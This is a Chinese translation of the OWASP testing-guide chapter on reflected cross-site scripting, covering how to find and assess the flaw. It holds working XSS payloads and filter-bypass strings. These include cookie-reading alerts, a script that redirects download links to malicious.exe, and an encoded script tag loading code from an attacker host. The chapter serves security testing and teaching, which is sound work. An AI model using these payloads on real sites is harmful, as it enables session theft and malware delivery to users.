# 测试反射型跨站脚本

|ID          |
|------------|
|WSTG-INPV-01|

## 概述

当攻击者注入可在浏览器执行的代码到单个HTTP响应中时，就会发生反射型[跨站脚本（XSS）](https://owasp.org/www-community/attacks/xss/)。注入的攻击不会被存储在应用程序本身中；它是非持久性的，只影响打开恶意构造链接或第三方网页的用户。攻击字符串作为构造的URI或HTTP参数的一部分被包含，在应用程序中处理不当，并返回给受害者。

反射型XSS是野外发现的最常见的XSS攻击类型。反射型XSS攻击也被称为非持久性XSS攻击，由于攻击 payload 是通过单个请求和响应传递和执行的，它们也被称为一阶或类型1 XSS。

当Web应用程序容易受到这种类型的攻击时，它会将通过请求发送的未验证输入传递回客户端。攻击的常见模式包括：设计步骤（攻击者创建和测试恶意URI）、社会工程步骤（说服受害者在其浏览器中加载此URI），以及最终使用受害者的浏览器执行恶意代码。

通常，攻击者的代码是用JavaScript语言编写的，但也会使用其他脚本语言，例如ActionScript和VBScript。攻击者通常利用这些漏洞来安装键盘记录器、窃取受害者cookie、执行剪贴板窃取以及更改页面内容（例如下载链接）。

防止XSS漏洞的主要困难之一是适当的字符编码。在某些情况下，Web服务器或Web应用程序可能没有过滤某些字符编码，因此例如Web应用程序可能过滤掉`<script>`，但可能不过滤`%3cscript%3e`，后者简单地包含了另一种标签编码。

## 测试目标

- 识别在响应中反映的变量。
- 评估它们接受的输入以及返回时应用的编码（如果有）。

## 如何测试

### 黑盒测试

黑盒测试将至少包括三个阶段：

#### 检测输入向量

检测输入向量。对于每个网页，测试人员必须确定所有Web应用程序的用户定义变量以及如何输入它们。这包括隐藏或非显而易见的输入，例如HTTP参数、POST数据、隐藏表单字段值以及预定义的单选或选择值。通常使用浏览器内HTML编辑器或Web代理来查看这些隐藏变量。见下面的示例。

#### 分析输入向量

分析每个输入向量以检测潜在漏洞。为了检测XSS漏洞，测试人员通常会使用针对每个输入向量精心构造的输入数据。这样的输入数据通常是无害的，但会触发Web浏览器的响应，从而显现漏洞。测试数据可以使用Web应用程序模糊测试器、预定义的已知攻击字符串自动列表或手动生成。
  以下是一些此类输入数据的示例：

- `<script>alert(123)</script>`
- `"><script>alert(document.cookie)</script>`

有关潜在测试字符串的完整列表，请参阅[XSS过滤器绕过速查表](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)。

#### 检查影响

对于上一阶段尝试的每个测试输入，测试人员将分析结果并确定它是否代表了会对Web应用程序安全产生实际影响的漏洞。这需要检查生成的网页HTML并搜索测试输入。找到后，测试人员识别任何未正确编码、替换或过滤的特殊字符。易受攻击的未过滤特殊字符集将取决于该HTML上下文的上下文。

理想情况下，所有HTML特殊字符都将被替换为HTML实体。需要识别的主要HTML实体包括：

- `>` （大于号）
- `<` （小于号）
- `&` （和号）
- `'` （单引号或撇号）
- `"` （双引号）

但是，完整的实体列表由HTML和XML规范定义。[维基百科有完整的参考](https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references)。

在HTML动作或JavaScript代码的上下文中，需要转义、编码、替换或过滤另一组特殊字符。这些字符包括：

- `\n` （换行符）
- `\r` （回车符）
- `'` （单引号或撇号）
- `"` （双引号）
- `\` （反斜杠）
- `\uXXXX` （Unicode值）

更完整的参考，请参阅[Mozilla JavaScript指南](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Values,_variables,_and_literals#Using_special_characters_in_strings)。

#### 示例1

例如，考虑一个带有欢迎公告`Welcome %username%`和下载链接的站点。

![XSS示例1](images/XSS_Example1.png)\
*图4.7.1-1：XSS示例1*

测试人员必须怀疑每个数据入口点都可能导致XSS攻击。为了分析它，测试人员将尝试使用用户变量并触发漏洞。

让我们尝试点击以下链接并查看会发生什么：

```text
https://example.com/index.php?user=<script>alert(123)</script>
```

如果未应用清理，将导致以下弹出窗口：

![警告](images/Alert.png)\
*图4.7.1-2：XSS示例1*

这表明存在XSS漏洞，如果测试者点击测试者的链接，测试者可以在任何用户的浏览器中执行其选择的代码。

#### 示例2

让我们尝试其他代码片段（链接）：

```text
https://example.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a");AllLinks[0].href = "https://badexample.com/malicious.exe";}</script>
```

这将产生以下行为：

![XSS示例2](images/XSS_Example2.png)\
*图4.7.1-3：XSS示例2*

这将导致点击测试者提供的链接的用户从他们控制的站点下载文件`malicious.exe`。

### 绕过XSS过滤器

反射型跨站脚本攻击的防护方式包括：Web应用程序清理输入、Web应用程序防火墙阻止恶意输入，或嵌入现代Web浏览器的机制。测试人员必须假设Web浏览器不会阻止攻击的情况下测试漏洞。浏览器可能已过期，或已禁用内置安全功能。同样，Web应用程序防火墙不能保证识别新颖的、未知攻击。攻击者可能制作Web应用程序防火墙无法识别的攻击字符串。

因此，大多数XSS防护必须依赖于Web应用程序对不受信任用户输入的清理。开发人员有多种清理机制可用，例如返回错误、删除、编码或替换无效输入。应用程序检测和纠正无效输入的方式是防止XSS的另一个主要弱点。拒绝列表可能不包含所有可能的攻击字符串，允许列表可能过于宽松，清理可能失败，或者某种类型的输入可能被错误地信任而保持未清理状态。所有这些都允许攻击者绕过XSS过滤器。

[XSS过滤器绕过速查表](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)记录了常见的过滤器绕过测试。

#### 示例3：标签属性值

由于这些过滤器基于拒绝列表，它们无法阻止所有类型的表达式。事实上，在某些情况下，XSS漏洞利用可以在不使用`<script>`标签的情况下进行，甚至可以在不使用通常被过滤的`<`和`>`等字符的情况下进行。

例如，Web应用程序可能使用用户输入值填充属性，如以下代码所示：

```html
<input type="text" name="state" value="INPUT_FROM_USER">
```

然后攻击者可以提交以下代码：

```text
" onfocus="alert(document.cookie)
```

#### 示例4：不同语法或编码

在某些情况下，基于签名的过滤器可以通过混淆攻击来简单地绕过。通常，您可以通过在语法或编码中插入意外变化来做到这一点。这些变化在代码返回时被浏览器接受为有效HTML，但也可能被过滤器接受。

以下是一些示例：

- `"><script >alert(document.cookie)</script >`
- `"><ScRiPt>alert(document.cookie)</ScRiPt>`
- `"%3cscript%3ealert(document.cookie)%3c/script%3e`

#### 示例5：绕过非递归过滤

有时清理只应用一次，而不是递归执行。在这种情况下，攻击者可以通过发送包含多个尝试的字符串来击败过滤器，例如：

```text
<scr<script>ipt>alert(document.cookie)</script>
```

#### 示例6：包含外部脚本

现在假设目标站点的开发人员实现了以下代码来保护输入免受外部脚本包含的影响：

```php
<?
    $re = "/<script[^>]+src/i";

    if (preg_match($re, $_GET['var']))
    {
        echo "Filtered";
        return;
    }
    echo "Welcome ".$_GET['var']." !";
?>
```

解析上述正则表达式：

1. 检查`<script`
2. 检查`" "`（空格）
3. 一个或多个不是字符`>`的任意字符
4. 检查`src`

这对于过滤像`<script src="https://attacker/xss.js"></script>`这样的表达式很有用，这是一种常见攻击。但是，在这种情况下，可以使用`>`字符在script和src之间的属性中绕过清理，例如：

```text
https://example/?var=<SCRIPT%20a=">"%20SRC="https://attacker/xss.js"></SCRIPT>
```

这将利用之前显示的反射型跨站脚本漏洞，执行存储在攻击者Web服务器上的JavaScript代码，就像它来自受害站点`https://example/`一样。

#### 示例7：HTTP参数污染（HPP）

另一种绕过过滤器的方法是HTTP参数污染，该技术于2009年由Stefano di Paola和Luca Carettoni在OWASP波兰会议上首次提出。有关更多信息，请参阅[测试HTTP参数污染](04-Testing_for_HTTP_Parameter_Pollution.md)。这种规避技术包括在具有相同名称的多个参数之间分割攻击向量。每个参数值的操作取决于每个Web技术如何解析这些参数，因此这种类型的规避并非总是可行的。如果测试环境连接具有相同名称的所有参数的值，则攻击者可以使用此技术来绕过基于模式的安全机制。
常规攻击：

```text
https://example/page.php?param=<script>[...]</script>
```

使用HPP的攻击：

```text
https://example/page.php?param=<script&param=>[...]</&param=script>
```

有关过滤器绕过技术的更详细列表，请参阅[XSS过滤器绕过速查表](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)。最后，分析答案会变得复杂。执行此操作的一种简单方法是使用弹出对话框的代码，如我们的示例中所示。这通常表明攻击者可以将其选择的任意JavaScript执行到访问者的浏览器中。

### 灰盒测试

灰盒测试类似于黑盒测试。在灰盒测试中，渗透测试人员具有应用程序的部分知识。在这种情况下，关于用户输入、输入验证控件以及用户输入如何呈现回用户的信息可能已被渗透测试人员所知。

如果有源代码可用（白盒测试），则应分析所有从用户接收的变量。此外，测试人员应分析任何清理程序，以确定这些程序是否可以绕过。

## 工具

- [PHP字符编码器(PCE)](https://cybersecurity.wtf/encoder/)帮助您将任意文本编码为65种字符集，并可用于自定义payload。
- [Hackvertor](https://hackvertor.co.uk/public)是一个在线工具，允许对JavaScript（或任何字符串输入）进行多种类型的编码和混淆。
- [XSS-Proxy](https://xss-proxy.sourceforge.net/)是一种高级跨站脚本（XSS）攻击工具。
- [ratproxy](https://code.google.com/archive/p/ratproxy/)是一种半自动的大规模被动Web应用程序安全审计工具，针对在复杂Web 2.0环境中基于对现有用户发起流量的准确和敏感检测以及潜在问题和安全相关设计模式的自动注释进行了优化。
- [Burp Proxy](https://portswigger.net/burp/)是一个用于攻击和测试Web应用程序的交互式HTTP/S代理服务器。
- [Zed攻击代理(ZAP)](https://www.zaproxy.org)是一个用于攻击和测试Web应用程序的交互式HTTP/S代理服务器，内置扫描仪。

## 参考资料

### OWASP资源

- [XSS过滤器绕过速查表](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

### 书籍

- Joel Scambray, Mike Shema, Caleb Sima - "Hacking Exposed Web Applications"，第二版，McGraw-Hill，2006 - ISBN 0-07-226229-0
- Dafydd Stuttard, Marcus Pinto - "Web Application Handbook - 发现和利用安全漏洞"，2008，Wiley，ISBN 978-0-470-17077-9
- Jeremiah Grossman, Robert "RSnake" Hansen, Petko "pdp" D. Petkov, Anton Rager, Seth Fogie - "跨站脚本攻击：XSS利用与防御"，2007，Syngress，ISBN-10: 1-59749-154-3

### 白皮书

- [CERT - 客户端Web请求中嵌入的恶意HTML标签](https://resources.sei.cmu.edu/asset_files/WhitePaper/2000_019_001_496188.pdf)
- [cgisecurity.com - 跨站脚本常见问题解答](https://www.cgisecurity.com/xss-faq.html)
- [S. Frei, T. Dübendorfer, G. Ollmann, M. May - 了解Web浏览器威胁](https://www.techzoom.net/Publications/Insecurity-Iceberg)
